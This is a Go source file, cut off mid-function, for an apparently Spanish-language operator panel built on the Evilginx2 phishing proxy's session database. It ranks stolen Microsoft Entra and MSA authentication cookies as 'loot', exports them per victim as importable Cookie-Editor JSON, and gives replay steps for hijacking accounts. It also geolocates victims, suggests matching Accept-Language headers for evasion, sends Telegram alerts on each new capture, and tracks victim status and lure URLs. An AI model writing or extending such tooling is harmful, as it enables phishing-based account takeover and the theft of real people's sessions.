package main

import (
	"archive/zip"
	"bytes"
	"crypto/subtle"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/tidwall/buntdb"
)

//go:embed index.html
var indexHTML []byte

const version = "1.5.2"

// ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----

type CookieToken struct {
	Name     string `json:"Name"`
	Value    string `json:"Value"`
	Path     string `json:"Path"`
	HttpOnly bool   `json:"HttpOnly"`
}

type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

// ---- Cookie export (Cookie-Editor / StorageAce compatible) ----

type ExpCookie struct {
	Path           string `json:"path"`
	Domain         string `json:"domain"`
	ExpirationDate int64  `json:"expirationDate"`
	Value          string `json:"value"`
	Name           string `json:"name"`
	HttpOnly       bool   `json:"httpOnly"`
	HostOnly       bool   `json:"hostOnly"`
	Secure         bool   `json:"secure"`
	Session        bool   `json:"session"`
	SameSite       string `json:"sameSite"`
}

func (s Session) capturedAt() int64 {
	if s.UpdateTime > 0 {
		return s.UpdateTime
	}
	if s.CreateTime > 0 {
		return s.CreateTime
	}
	return time.Now().Unix()
}

func (s Session) exportCookies() []ExpCookie {
	var out []ExpCookie
	captured := s.capturedAt()
	for domain, names := range s.CookieTokens {
		for name, ct := range names {
			if ct == nil {
				continue
			}
			path := ct.Path
			if path == "" {
				path = "/"
			}
			dom := domain
			hostOnly := !strings.HasPrefix(domain, ".")
			secure := strings.HasPrefix(name, "__Host-") || strings.HasPrefix(name, "__Secure-")
			if strings.HasPrefix(name, "__Host-") {
				hostOnly = true
				secure = true
				dom = strings.TrimPrefix(domain, ".")
				path = "/"
			}
			if !secure {
				switch strings.ToLower(name) {
				case "estsauth", "estsauthpersistent", "rpssecauth", "mspauth", "signinstatescookie":
					secure = true
				}
			}
			exp, kind := cookieTTL(name, ct.Value, captured)
			session := kind == "session" || kind == "idle24h"
			if exp == 0 && !session {
				// Cookie-Editor needs an Expires to persist the cookie in the browser.
				// Not a claim about IdP validity — see ttl_kind in the API.
				exp = captured + 90*24*3600
			}
			out = append(out, ExpCookie{
				Path:           path,
				Domain:         dom,
				ExpirationDate: exp,
				Value:          ct.Value,
				Name:           name,
				HttpOnly:       ct.HttpOnly,
				HostOnly:       hostOnly,
				Secure:         secure,
				Session:        session,
				SameSite:       "no_restriction",
			})
		}
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Domain == out[j].Domain {
			return out[i].Name < out[j].Name
		}
		return out[i].Domain < out[j].Domain
	})
	return out
}

func (s Session) cookieCount() int {
	n := 0
	for _, names := range s.CookieTokens {
		n += len(names)
	}
	return n
}

// Microsoft leaves these stubs when a cookie is deleted or never issued.
// "__Host-MSAAUTH=11" is the passwordless MSA path: the real session is __Host-MSAAUTHP.
func isJunkCookieValue(v string) bool {
	switch v {
	case "", "Disabled", "estsfd", "11":
		return true
	}
	return len(v) <= 2
}

type lootInfo struct {
	Valid      bool
	Kind       string // entra | msa | ""
	Token      string // strongest cookie name
	Persistent bool
	Tokens     []string
	Expires    int64  // unix; only set for JWT exp
	TTLKind    string // parsed | idle90d | idle24h | session | persistent | unknown
}

func jwtExp(val string) (int64, bool) {
	parts := strings.Split(val, ".")
	if len(parts) != 3 || !strings.HasPrefix(parts[0], "eyJ") {
		return 0, false
	}
	payload, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		payload, err = base64.URLEncoding.DecodeString(parts[1])
		if err != nil {
			return 0, false
		}
	}
	var claims struct {
		Exp int64 `json:"exp"`
	}
	if json.Unmarshal(payload, &claims) != nil || claims.Exp <= 0 {
		return 0, false
	}
	return claims.Exp, true
}

// cookieTTL classifies how long a captured auth cookie can be replayed.
// Evilginx does not store Set-Cookie Max-Age/Expires. JWT exp is the only
// hard timestamp. Everything else is Microsoft's published session model,
// not a countdown from capture:
//
//   idle90d  — ESTSAUTHPERSISTENT: 90-day max inactivity, rolling, until-revoked
//              (learn.microsoft.com identity-platform/configurable-token-lifetimes)
//   idle24h  — ESTSAUTH: 24 hours or until the browser is closed
//              (learn.microsoft.com entra KMSI: non-persistent cookie)
//   session  — no Expires on the cookie (dies with the browser)
//   persistent — survives browser close; Microsoft does not publish Max-Age
//              for MSA __Host-MSAAUTHP. Do not invent 1 year.
func cookieTTL(name, value string, captured int64) (expires int64, kind string) {
	if exp, ok := jwtExp(value); ok {
		return exp, "parsed"
	}
	switch strings.ToLower(name) {
	case "estsauthpersistent":
		return 0, "idle90d"
	case "estsauth":
		return 0, "idle24h"
	case "__host-msaauthp", "rpssecauth", "mspauth":
		return 0, "persistent"
	case "__host-msaauth", "signinstatescookie":
		return 0, "session"
	case "sid", "hsid", "ssid", "apisid", "sapisid", "lsid", "__secure-1psid", "__secure-3psid":
		return 0, "persistent"
	default:
		return 0, "unknown"
	}
}

// inspectLoot classifies a capture. "Valid" means a replayable IdP token is present,
// not merely a password or a routing cookie.
func (s Session) inspectLoot() lootInfo {
	var info lootInfo
	best := 0
	seen := map[string]bool{}
	captured := s.capturedAt()
	rankOf := func(name string) (rank int, kind string, persist bool) {
		switch strings.ToLower(name) {
		case "estsauthpersistent":
			return 40, "entra", true
		case "__host-msaauthp":
			return 39, "msa", true
		case "estsauth":
			return 30, "entra", false
		case "__host-msaauth":
			return 29, "msa", false
		case "rpssecauth", "mspauth":
			return 28, "msa", false
		case "signinstatescookie":
			return 10, "entra", false
		default:
			return 0, "", false
		}
	}
	for _, names := range s.CookieTokens {
		for name, ct := range names {
			if ct == nil || isJunkCookieValue(ct.Value) {
				continue
			}
			rank, kind, persist := rankOf(name)
			if rank == 0 {
				continue
			}
			if !seen[name] {
				seen[name] = true
				info.Tokens = append(info.Tokens, name)
			}
			if persist {
				info.Persistent = true
			}
			if rank > best {
				best = rank
				info.Token = name
				info.Kind = kind
				exp, k := cookieTTL(name, ct.Value, captured)
				info.Expires = exp
				info.TTLKind = k
			}
		}
	}
	sort.Strings(info.Tokens)
	if best > 0 {
		info.Valid = true
	}
	return info
}

func (s Session) hasValidSession() bool { return s.inspectLoot().Valid }

func (s Session) replayPlan() replayPlan {
	loot := s.inspectLoot()
	p := replayPlan{UASummary: uaSummary(s.UserAgent)}
	switch loot.Kind {
	case "entra":
		p.Label = "Microsoft Entra"
		p.ImportOn = "https://login.microsoftonline.com"
		p.ThenOpen = "https://www.office.com"
	case "msa":
		p.Label = "Microsoft MSA"
		p.ImportOn = "https://login.live.com"
		p.ThenOpen = "https://account.microsoft.com"
		p.Avoid = "https://outlook.live.com (no SSO from MSAUTHP)"
	default:
		p.Label = s.Phishlet
	}
	return p
}

func uaSummary(ua string) string {
	if ua == "" {
		return ""
	}
	osName := "unknown OS"
	switch {
	case strings.Contains(ua, "Windows NT 10"):
		osName = "Windows 10/11"
	case strings.Contains(ua, "Windows NT"):
		osName = "Windows"
	case strings.Contains(ua, "Mac OS X") || strings.Contains(ua, "Macintosh"):
		osName = "macOS"
	case strings.Contains(ua, "Android"):
		osName = "Android"
	case strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad"):
		osName = "iOS"
	case strings.Contains(ua, "CrOS"):
		osName = "ChromeOS"
	case strings.Contains(ua, "Linux"):
		osName = "Linux"
	}
	browser := "unknown browser"
	pick := func(prefix string) string {
		i := strings.Index(ua, prefix)
		if i < 0 {
			return ""
		}
		rest := ua[i+len(prefix):]
		n := 0
		for n < len(rest) && ((rest[n] >= '0' && rest[n] <= '9') || rest[n] == '.') {
			n++
		}
		ver := rest[:n]
		if dot := strings.Index(ver, "."); dot > 0 {
			ver = ver[:dot]
		}
		return ver
	}
	switch {
	case strings.Contains(ua, "Edg/"):
		browser = "Edge " + pick("Edg/")
	case strings.Contains(ua, "OPR/"):
		browser = "Opera " + pick("OPR/")
	case strings.Contains(ua, "Chrome/") && !strings.Contains(ua, "Chromium"):
		browser = "Chrome " + pick("Chrome/")
	case strings.Contains(ua, "Firefox/"):
		browser = "Firefox " + pick("Firefox/")
	case strings.Contains(ua, "Safari/") && strings.Contains(ua, "Version/"):
		browser = "Safari " + pick("Version/")
	}
	return strings.TrimSpace(browser + " · " + osName)
}

func suggestAcceptLang(cc string) string {
	cc = strings.ToUpper(strings.TrimSpace(cc))
	m := map[string]string{
		"ES": "es-ES,es;q=0.9,en;q=0.8", "MX": "es-MX,es;q=0.9,en;q=0.8",
		"AR": "es-AR,es;q=0.9,en;q=0.8", "CO": "es-CO,es;q=0.9,en;q=0.8",
		"CL": "es-CL,es;q=0.9,en;q=0.8", "PE": "es-PE,es;q=0.9,en;q=0.8",
		"US": "en-US,en;q=0.9", "GB": "en-GB,en;q=0.9", "AU": "en-AU,en;q=0.9",
		"CA": "en-CA,en;q=0.9,fr-CA;q=0.8", "IE": "en-IE,en;q=0.9",
		"FR": "fr-FR,fr;q=0.9,en;q=0.8", "DE": "de-DE,de;q=0.9,en;q=0.8",
		"IT": "it-IT,it;q=0.9,en;q=0.8", "PT": "pt-PT,pt;q=0.9,en;q=0.8",
		"BR": "pt-BR,pt;q=0.9,en;q=0.8", "NL": "nl-NL,nl;q=0.9,en;q=0.8",
		"BE": "fr-BE,fr;q=0.9,nl;q=0.8,en;q=0.7", "CH": "de-CH,de;q=0.9,fr;q=0.8,en;q=0.7",
		"AT": "de-AT,de;q=0.9,en;q=0.8", "PL": "pl-PL,pl;q=0.9,en;q=0.8",
		"TR": "tr-TR,tr;q=0.9,en;q=0.8", "RU": "ru-RU,ru;q=0.9,en;q=0.8",
		"JP": "ja-JP,ja;q=0.9,en;q=0.8", "CN": "zh-CN,zh;q=0.9,en;q=0.8",
		"KR": "ko-KR,ko;q=0.9,en;q=0.8", "IN": "en-IN,en;q=0.9,hi;q=0.8",
		"AE": "ar-AE,ar;q=0.9,en;q=0.8", "SA": "ar-SA,ar;q=0.9,en;q=0.8",
	}
	if s, ok := m[cc]; ok {
		return s
	}
	if len(cc) != 2 {
		return ""
	}
	lo := strings.ToLower(cc)
	return lo + "-" + cc + "," + lo + ";q=0.9,en;q=0.8"
}

func cleanIP(s string) string {
	s = strings.TrimSpace(s)
	if s == "" {
		return ""
	}
	if host, _, err := net.SplitHostPort(s); err == nil {
		s = host
	}
	s = strings.Trim(s, "[]")
	ip := net.ParseIP(s)
	if ip == nil {
		return ""
	}
	return ip.String()
}

func isPrivateIP(s string) bool {
	ip := net.ParseIP(s)
	if ip == nil {
		return true
	}
	return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified()
}

type geoStore struct {
	mu    sync.Mutex
	m     map[string]geoInfo
	file  string
	on    bool
	infl  map[string]bool
}

var geo = &geoStore{m: map[string]geoInfo{}, infl: map[string]bool{}}

var geoClient = &http.Client{Timeout: 4 * time.Second}

func (g *geoStore) load() {
	if g.file == "" {
		return
	}
	b, err := os.ReadFile(g.file)
	if err != nil {
		return
	}
	g.mu.Lock()
	json.Unmarshal(b, &g.m)
	if g.m == nil {
		g.m = map[string]geoInfo{}
	}
	g.mu.Unlock()
}

func (g *geoStore) saveLocked() {
	if g.file == "" {
		return
	}
	b, _ := json.MarshalIndent(g.m, "", "  ")
	os.WriteFile(g.file, b, 0600)
}

func (g *geoStore) get(ip string) (geoInfo, bool) {
	g.mu.Lock()
	defer g.mu.Unlock()
	v, ok := g.m[ip]
	return v, ok && v.CountryCode != ""
}

func (g *geoStore) lookup(ip string, block bool) geoInfo {
	ip = cleanIP(ip)
	if !g.on || ip == "" || isPrivateIP(ip) {
		return geoInfo{}
	}
	if v, ok := g.get(ip); ok {
		return v
	}
	g.mu.Lock()
	if g.infl[ip] {
		g.mu.Unlock()
		if !block {
			return geoInfo{}
		}
	} else {
		g.infl[ip] = true
		g.mu.Unlock()
		info := fetchGeo(ip)
		g.mu.Lock()
		delete(g.infl, ip)
		if info.CountryCode != "" {
			g.m[ip] = info
			g.saveLocked()
		}
		g.mu.Unlock()
		return info
	}
	// waiter: poll cache briefly
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if v, ok := g.get(ip); ok {
			return v
		}
		time.Sleep(150 * time.Millisecond)
	}
	return geoInfo{}
}

func fetchGeo(ip string) geoInfo {
	u := "http://ip-api.com/json/" + ip + "?fields=status,country,countryCode,regionName,city,isp,as,timezone,query"
	resp, err := geoClient.Get(u)
	if err != nil {
		return geoInfo{}
	}
	defer resp.Body.Close()
	var raw struct {
		Status      string `json:"status"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
		RegionName  string `json:"regionName"`
		City        string `json:"city"`
		ISP         string `json:"isp"`
		AS          string `json:"as"`
		Timezone    string `json:"timezone"`
	}
	if json.NewDecoder(resp.Body).Decode(&raw) != nil || raw.Status != "success" {
		return geoInfo{}
	}
	return geoInfo{
		Country: raw.Country, CountryCode: raw.CountryCode, Region: raw.RegionName,
		City: raw.City, ISP: raw.ISP, ASN: raw.AS, Timezone: raw.Timezone,
	}
}

func warmGeo(sessions []Session) {
	seen := map[string]bool{}
	for _, s := range sessions {
		ip := cleanIP(s.RemoteAddr)
		if ip == "" || seen[ip] || isPrivateIP(ip) {
			continue
		}
		seen[ip] = true
		if _, ok := geo.get(ip); ok {
			continue
		}
		geo.lookup(ip, true)
		time.Sleep(300 * time.Millisecond)
	}
}

// ---- API shapes ----

type apiSession struct {
	Id         int      `json:"id"`
	Phishlet   string   `json:"phishlet"`
	Username   string   `json:"username"`
	Password   string   `json:"password"`
	Valid      bool     `json:"valid"`
	Kind       string   `json:"kind"`
	Token      string   `json:"token"`
	Persistent bool     `json:"persistent"`
	Tokens     []string `json:"tokens"`
	Expires    int64    `json:"expires"`
	TTLKind    string   `json:"ttl_kind"`
	Cookies    int      `json:"cookies"`
	RemoteAddr string   `json:"remote_addr"`
	Create     int64    `json:"create"`
	Update     int64    `json:"update"`
	UserAgent  string   `json:"useragent"`
	Landing    string      `json:"landing"`
	SessionId  string      `json:"session_id"`
	Geo        *geoInfo    `json:"geo,omitempty"`
	Replay     *replayPlan `json:"replay,omitempty"`
}

type geoInfo struct {
	Country     string `json:"country"`
	CountryCode string `json:"country_code"`
	Region      string `json:"region"`
	City        string `json:"city"`
	ISP         string `json:"isp"`
	ASN         string `json:"asn"`
	Timezone    string `json:"timezone"`
}

type replayPlan struct {
	ImportOn   string `json:"import_on"`
	ThenOpen   string `json:"then_open"`
	Avoid      string `json:"avoid"`
	Label      string `json:"label"`
	UASummary  string `json:"ua_summary"`
	AcceptLang string `json:"accept_lang"`
}

type apiData struct {
	Now        string       `json:"now"`
	DB         string       `json:"db"`
	SBEnabled  bool         `json:"sb_enabled"`
	GeoEnabled bool         `json:"geo_enabled"`
	Sessions   []apiSession `json:"sessions"`
}

// sbEnabled reflects whether Google Safe Browsing lookups are active (OFF unless
// an API key is supplied). Surfaced to the UI so the state is always visible.
var sbEnabled bool
var geoEnabled bool

// ---- Data loading with mtime cache ----
// The full snapshot+parse only runs when data.db actually changed (a new
// capture). Idle polling (auto-refresh) is then near-free.

var (
	cacheMu     sync.Mutex
	cacheSess   []Session
	cacheMtime  time.Time
	cachePath   string
	cacheLoaded bool
)

func loadSessionsCached(dbPath string) ([]Session, error) {
	fi, err := os.Stat(dbPath)
	if err != nil {
		return nil, err
	}
	cacheMu.Lock()
	defer cacheMu.Unlock()
	if cacheLoaded && cachePath == dbPath && fi.ModTime().Equal(cacheMtime) {
		return cacheSess, nil
	}
	s, err := loadSessions(dbPath)
	if err != nil {
		// data.db may have been copied mid-write; keep serving the last good
		// snapshot instead of failing the whole request.
		if cacheLoaded {
			log.Println("recarga fallida, sirviendo cache previa:", err)
			return cacheSess, nil
		}
		return nil, err
	}
	cacheSess, cacheMtime, cachePath, cacheLoaded = s, fi.ModTime(), dbPath, true
	return s, nil
}

// ---- Data loading (snapshot copy, never touches evilginx's live file) ----

func loadSessions(dbPath string) ([]Session, error) {
	tmp, err := os.CreateTemp("", "evil-*.db")
	if err != nil {
		return nil, err
	}
	tmpName := tmp.Name()
	defer os.Remove(tmpName)

	src, err := os.Open(dbPath)
	if err != nil {
		tmp.Close()
		return nil, fmt.Errorf("open db: %w", err)
	}
	if _, err := io.Copy(tmp, src); err != nil {
		src.Close()
		tmp.Close()
		return nil, fmt.Errorf("copy db: %w", err)
	}
	src.Close()
	tmp.Close()

	db, err := buntdb.Open(tmpName)
	if err != nil {
		return nil, fmt.Errorf("open buntdb snapshot: %w", err)
	}
	defer db.Close()

	byID := map[int]Session{}
	err = db.View(func(tx *buntdb.Tx) error {
		return tx.Ascend("", func(key, value string) bool {
			var s Session
			if err := json.Unmarshal([]byte(value), &s); err == nil {
				if s.SessionId != "" || s.CookieTokens != nil || s.Username != "" {
					byID[s.Id] = s
				}
			}
			return true
		})
	})
	if err != nil {
		return nil, err
	}

	out := make([]Session, 0, len(byID))
	for _, s := range byID {
		out = append(out, s)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].UpdateTime > out[j].UpdateTime })
	return out, nil
}

// ---- Estado por víctima (usada / notas), persistido ----

type victimState struct {
	Used   bool   `json:"used"`
	Status string `json:"status"` // inbox | copied | replayed | bounced | done
	Notes  string `json:"notes"`
}

func normalizeVState(st victimState) victimState {
	if st.Status == "" {
		if st.Used {
			st.Status = "done"
		} else {
			st.Status = "inbox"
		}
	}
	st.Used = st.Status == "done"
	return st
}

var (
	vsMu   sync.Mutex
	vsFile string
	vsMap  = map[string]victimState{}
)

func loadVState() {
	vsMu.Lock()
	defer vsMu.Unlock()
	b, err := os.ReadFile(vsFile)
	if err != nil {
		return
	}
	json.Unmarshal(b, &vsMap)
}

func saveVStateLocked() { b, _ := json.MarshalIndent(vsMap, "", "  "); os.WriteFile(vsFile, b, 0600) }

func vstateHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			vsMu.Lock()
			m := map[string]victimState{}
			for k, v := range vsMap {
				m[k] = normalizeVState(v)
			}
			vsMu.Unlock()
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			json.NewEncoder(w).Encode(m)
		case http.MethodPost:
			r.ParseForm()
			user := strings.ToLower(strings.TrimSpace(r.FormValue("user")))
			if user == "" {
				http.Error(w, "user requerido", 400)
				return
			}
			vsMu.Lock()
			st := vsMap[user]
			if v := r.FormValue("status"); v != "" {
				st.Status = strings.ToLower(strings.TrimSpace(v))
				st.Used = st.Status == "done"
			} else if v := r.FormValue("used"); v != "" {
				st.Used = boolForm(v)
				if st.Used {
					st.Status = "done"
				} else if st.Status == "done" || st.Status == "" {
					st.Status = "inbox"
				}
			}
			if _, ok := r.Form["notes"]; ok {
				st.Notes = r.FormValue("notes")
			}
			vsMap[user] = normalizeVState(st)
			saveVStateLocked()
			vsMu.Unlock()
			w.WriteHeader(204)
		default:
			http.Error(w, "method not allowed", 405)
		}
	}
}

// ---- Exports ----

func sanitize(s string) string {
	if s == "" {
		return "sin_usuario"
	}
	var b strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '.' || r == '-' || r == '_' || r == '@' {
			b.WriteRune(r)
		} else {
			b.WriteRune('_')
		}
	}
	return b.String()
}

// exportLootHandler streams a zip with the best valid session's cookies per
// victim, ready to import, plus an INDEX.txt.
func exportLootHandler(dbPath string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessions, err := loadSessionsCached(dbPath)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		best := map[string]Session{}
		for _, s := range sessions {
			if !s.hasValidSession() {
				continue
			}
			key := strings.ToLower(strings.TrimSpace(s.Username))
			if key == "" {
				key = "_sin_usuario_" + fmt.Sprint(s.Id)
			}
			cur, ok := best[key]
			if !ok || s.cookieCount() > cur.cookieCount() || (s.cookieCount() == cur.cookieCount() && s.UpdateTime > cur.UpdateTime) {
				best[key] = s
			}
		}
		w.Header().Set("Content-Type", "application/zip")
		w.Header().Set("Content-Disposition", "attachment; filename=evilginx-loot.zip")
		zw := zip.NewWriter(w)
		defer zw.Close()
		var idx strings.Builder
		idx.WriteString("usuario\tphishlet\tip\tcookies\tcapturado\n")
		for _, s := range best {
			name := sanitize(s.Username) + "_" + sanitize(s.Phishlet) + "_" + fmt.Sprint(s.Id) + ".json"
			if f, err := zw.Create(name); err == nil {
				enc := json.NewEncoder(f)
				enc.SetIndent("", "  ")
				enc.Encode(s.exportCookies())
			}
			idx.WriteString(fmt.Sprintf("%s\t%s\t%s\t%d\t%s\n", s.Username, s.Phishlet, s.RemoteAddr, s.cookieCount(), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")))
		}
		if f, err := zw.Create("INDEX.txt"); err == nil {
			f.Write([]byte(idx.String()))
		}
	}
}

// exportCSVHandler streams a masked CSV (no secrets) for the engagement report.
func exportCSVHandler(dbPath string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		sessions, err := loadSessionsCached(dbPath)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		w.Header().Set("Content-Type", "text/csv; charset=utf-8")
		w.Header().Set("Content-Disposition", "attachment; filename=evilginx-sesiones.csv")
		fmt.Fprintln(w, "id,phishlet,usuario,sesion_valida,tipo,token,persistente,cookies,ip,creado,actualizado")
		for _, s := range sessions {
			loot := s.inspectLoot()
			fmt.Fprintf(w, "%d,%s,%q,%t,%s,%s,%t,%d,%s,%s,%s\n",
				s.Id, s.Phishlet, s.Username, loot.Valid, loot.Kind, loot.Token, loot.Persistent, s.cookieCount(), s.RemoteAddr,
				time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04:05"))
		}
	}
}

// ---- Settings (editable desde el panel, persistidas) ----

type settings struct {
	TGToken       string `json:"tg_token"`
	TGChat        string `json:"tg_chat"`
	TGEnabled     bool   `json:"tg_enabled"`
	MinimalAlerts bool   `json:"minimal_alerts"`
}

var (
	setMu   sync.Mutex
	setFile string
	setCur  settings
)

func loadSettings() {
	setMu.Lock()
	defer setMu.Unlock()
	b, err := os.ReadFile(setFile)
	if err != nil {
		return
	}
	json.Unmarshal(b, &setCur)
}

func saveSettingsLocked() { b, _ := json.MarshalIndent(setCur, "", "  "); os.WriteFile(setFile, b, 0600) }

func getSettings() settings { setMu.Lock(); defer setMu.Unlock(); return setCur }

func boolForm(v string) bool { return v == "true" || v == "on" || v == "1" }

func settingsHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			c := getSettings()
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			json.NewEncoder(w).Encode(map[string]interface{}{
				"tg_chat":        c.TGChat,
				"tg_enabled":     c.TGEnabled,
				"minimal_alerts": c.MinimalAlerts,
				"tg_token_set":   c.TGToken != "",
			})
		case http.MethodPost:
			r.ParseForm()
			setMu.Lock()
			if tok := strings.TrimSpace(r.FormValue("tg_token")); tok != "" {
				setCur.TGToken = tok
			}
			setCur.TGChat = strings.TrimSpace(r.FormValue("tg_chat"))
			setCur.TGEnabled = boolForm(r.FormValue("tg_enabled"))
			setCur.MinimalAlerts = boolForm(r.FormValue("minimal_alerts"))
			saveSettingsLocked()
			setMu.Unlock()
			w.WriteHeader(204)
		default:
			http.Error(w, "method not allowed", 405)
		}
	}
}

func testTelegramHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		c := getSettings()
		if c.TGToken == "" || c.TGChat == "" {
			http.Error(w, "faltan token o chat_id (guardalos primero)", 400)
			return
		}
		if err := sendTelegram(c.TGToken, c.TGChat, "✅ Test desde el panel de Evilginx. La configuración funciona."); err != nil {
			http.Error(w, err.Error(), 502)
			return
		}
		w.WriteHeader(204)
	}
}

// ---- Telegram alerts ----

// tgAPIBase is overridable via env TG_API_BASE for testing.
var tgAPIBase = "https://api.telegram.org"

func init() {
	if v := os.Getenv("TG_API_BASE"); v != "" {
		tgAPIBase = v
	}
}

func sendTelegram(token, chat, text string) error {
	form := url.Values{}
	form.Set("chat_id", chat)
	form.Set("text", text)
	form.Set("parse_mode", "Markdown")
	form.Set("disable_web_page_preview", "true")
	resp, err := http.PostForm(fmt.Sprintf("%s/bot%s/sendMessage", tgAPIBase, token), form)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram %d: %s", resp.StatusCode, string(b))
	}
	return nil
}

func hasPersistent(s Session) bool { return s.inspectLoot().Persistent }

// startWatcher polls the db and fires a Telegram alert on each NEW valid
// session. Existing valid sessions are seeded on start so it never spams the
// backlog; a fresh capture (new id) of an already-known victim still alerts.
func startWatcher(dbPath string, interval time.Duration) {
	alerted := map[int]bool{}
	if s, err := loadSessionsCached(dbPath); err == nil {
		for _, x := range s {
			if x.hasValidSession() {
				alerted[x.Id] = true
			}
		}
	}
	go func() {
		t := time.NewTicker(interval)
		defer t.Stop()
		for range t.C {
			s, err := loadSessionsCached(dbPath)
			if err != nil {
				continue
			}
			for _, x := range s {
				if !x.hasValidSession() || alerted[x.Id] {
					continue
				}
				alerted[x.Id] = true
				cfg := getSettings()
				if !cfg.TGEnabled || cfg.TGToken == "" || cfg.TGChat == "" {
					continue
				}
				var msg string
				loot := x.inspectLoot()
				plan := x.replayPlan()
				ginfo := geo.lookup(x.RemoteAddr, true)
				plan.AcceptLang = suggestAcceptLang(ginfo.CountryCode)
				if cfg.MinimalAlerts {
					where := ginfo.CountryCode
					if where == "" {
						where = "?"
					}
					msg = fmt.Sprintf("Sesión %s · %s · %s · panel Replay", plan.Label, where, plan.UASummary)
				} else {
					user := x.Username
					if user == "" {
						user = "(sin usuario)"
					}
					persist := "sesión"
					if loot.Persistent {
						persist = "persistente"
					}
					loc := x.RemoteAddr
					if ginfo.Country != "" {
						loc = ginfo.Country
						if ginfo.CountryCode != "" {
							loc += " (" + ginfo.CountryCode + ")"
						}
						if ginfo.City != "" {
							loc += " · " + ginfo.City
						}
					}
					netw := ginfo.ASN
					if ginfo.ISP != "" && !strings.Contains(netw, ginfo.ISP) {
						if netw != "" {
							netw += " · " + ginfo.ISP
						} else {
							netw = ginfo.ISP
						}
					}
					var b strings.Builder
					fmt.Fprintf(&b, "%s · %s\n\n", plan.Label, persist)
					fmt.Fprintf(&b, "`%s`\n", user)
					fmt.Fprintf(&b, "%s\n", loc)
					if netw != "" {
						fmt.Fprintf(&b, "%s\n", netw)
					}
					if plan.UASummary != "" {
						fmt.Fprintf(&b, "%s\n", plan.UASummary)
					}
					if plan.ImportOn != "" {
						fmt.Fprintf(&b, "\nImportar en:\n%s\nLuego:\n%s\n", plan.ImportOn, plan.ThenOpen)
					}
					if plan.Avoid != "" {
						fmt.Fprintf(&b, "Evitar: %s\n", plan.Avoid)
					}
					fmt.Fprintf(&b, "\nPanel → Replay · #%d", x.Id)
					msg = b.String()
				}
				if err := sendTelegram(cfg.TGToken, cfg.TGChat, msg); err != nil {
					log.Println("telegram:", err)
				}
			}
		}
	}()
}

// ---- Saved lure URLs (manual, persisted) ----

type savedURL struct {
	URL   string `json:"url"`
	Label string `json:"label"`
	Added string `json:"added"`
}

var (
	urlMu   sync.Mutex
	urlFile string
	urlList []savedURL
)

func rootKey(u string) string {
	if p, err := url.Parse(u); err == nil && p.Host != "" {
		sc := p.Scheme
		if sc == "" {
			sc = "https"
		}
		return sc + "://" + p.Host + "/"
	}
	return ""
}

func loadURLs() {
	urlMu.Lock()
	defer urlMu.Unlock()
	b, err := os.ReadFile(urlFile)
	if err != nil {
		return
	}
	json.Unmarshal(b, &urlList)
}

func saveURLsLocked() {
	b, _ := json.MarshalIndent(urlList, "", "  ")
	os.WriteFile(urlFile, b, 0600)
}

func urlsHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			urlMu.Lock()
			list := append([]savedURL(nil), urlList...)
			urlMu.Unlock()
			type row struct {
				savedURL
				Host string `json:"host"`
				OK   bool   `json:"ok"`
			}
			out := make([]row, 0, len(list))
			domMu.Lock()
			for _, s := range list {
				host := ""
				if p, err := url.Parse(s.URL); err == nil {
					host = p.Host
				}
				st, ok := domState[rootKey(s.URL)]
				out = append(out, row{s, host, ok && st.OK})
			}
			domMu.Unlock()
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			json.NewEncoder(w).Encode(out)
		case http.MethodPost:
			u := strings.TrimSpace(r.FormValue("url"))
			label := strings.TrimSpace(r.FormValue("label"))
			if u == "" {
				http.Error(w, "url requerida", 400)
				return
			}
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			urlMu.Lock()
			exists := false
			for _, s := range urlList {
				if s.URL == u {
					exists = true
				}
			}
			if !exists {
				urlList = append(urlList, savedURL{URL: u, Label: label, Added: time.Now().Format("2006-01-02 15:04")})
				saveURLsLocked()
			}
			urlMu.Unlock()
			// immediate health check so the status shows right away
			st := checkDomain(rootKey(u))
			domMu.Lock()
			domState[rootKey(u)] = st
			domMu.Unlock()
			w.WriteHeader(204)
		case http.MethodDelete:
